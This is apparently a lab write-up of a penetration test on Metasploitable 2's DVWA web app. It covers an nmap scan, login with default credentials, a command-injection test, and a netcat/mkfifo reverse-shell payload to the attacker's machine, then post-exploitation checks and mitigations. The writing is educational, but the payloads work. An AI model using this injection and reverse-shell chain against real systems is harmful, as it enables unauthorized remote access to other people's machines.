# ✅ HTTP Service Exploitation – Metasploitable 2

## 📌 1. Overview

This project focuses on identifying and exploiting vulnerabilities in the **HTTP service (TCP/80)** running on **Metasploitable 2**. The goal is to demonstrate a full attack chain:

✅ Enumeration  
✅ Vulnerability discovery  
✅ Remote Code Execution (RCE)  
✅ Reverse Shell  
✅ System compromise  

---

## 📌 2. Target & Attacker Information

| Component | Details |
|----------|---------|
| Attacker Machine | Kali Linux |
| Attacker IP | 192.168.56.102 |
| Target Machine | Metasploitable 2 |
| Target IP | 192.168.56.101 |
| Service | HTTP (Apache 2.2.8) |
| Application | DVWA (Damn Vulnerable Web App) |

---

## 📌 3. Initial Enumeration

A service/version scan was performed using Nmap:

```bash
nmap -sV -O -p80 192.168.56.101

✅ Result

80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)

➡️ The target is running an outdated Apache server hosting DVWA, a vulnerable web app.
📌 4. Access to DVWA

DVWA was reachable via HTTP and allowed login using default credentials:

Username: admin
Password: password

✅ Indicates poor authentication policy
✅ Enables attacker access without brute force
📌 5. Vulnerability Identification – Command Injection

Inside DVWA:

Vulnerabilities → Command Injection

A test payload was executed:

127.0.0.1; id

✅ Response

uid=33(www-data) gid=33(www-data) groups=33(www-data)

✅ Confirmed Remote Command Execution (RCE)
✅ Commands executed on the server as www-data
📌 6. Exploitation – Reverse Shell
🔹 Step 1: Start listener on Kali

nc -lvnp 4444

Expected output:

listening on [any] 4444 ...

🔹 Step 2: Execute payload in DVWA

127.0.0.1; mkfifo /tmp/f; nc 192.168.56.102 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1

✅ This creates a FIFO pipe and spawns a reverse shell to the attacker.
📌 7. Successful Shell Capture

On the Kali listener:

connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 51058

We now have remote shell access.
📌 8. Post-Exploitation Validation
🔹 Check current user

whoami

www-data

🔹 System information

uname -a

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

🔹 Current directory

pwd

/var/www/dvwa/vulnerabilities/exec

🔹 Directory listing

ls -la

total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source

🔹 User identity details

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

🔹 Hostname

hostname

metasploitable

✅ Full remote access confirmed
✅ Code execution on the host
✅ Control of the target filesystem
📌 9. Impact Analysis
Category	Result
Vulnerability Type	Remote Code Execution
Access Level	www-data
Authentication Required	No
Impact	Critical
Risk	Full system compromise possible

An attacker could:

    Steal data

    Modify files

    Upload backdoors

    Escalate privileges

    Move laterally

📌 10. Root Cause

    Lack of input sanitization

    Vulnerable web application exposed

    Default credentials enabled

    Weak privilege isolation

📌 11. Mitigation Recommendations

✅ Sanitize and validate all user inputs
✅ Remove DVWA from production environments
✅ Disable default credentials
✅ Harden Apache and PHP configurations
✅ Apply least-privilege policies
✅ Implement monitoring and logging
✅ 12. Executive Summary

A critical RCE vulnerability was discovered in the HTTP service via DVWA's Command Injection module. The attacker successfully obtained a reverse shell on the target machine and executed system-level commands remotely, confirming full system compromise through the web interface.
✅ 13. Status
Stage	Result
Enumeration	✅ Complete
Vulnerability Discovery	✅ RCE identified
Exploitation	✅ Reverse shell obtained
Post-Exploitation	✅ System access confirmed
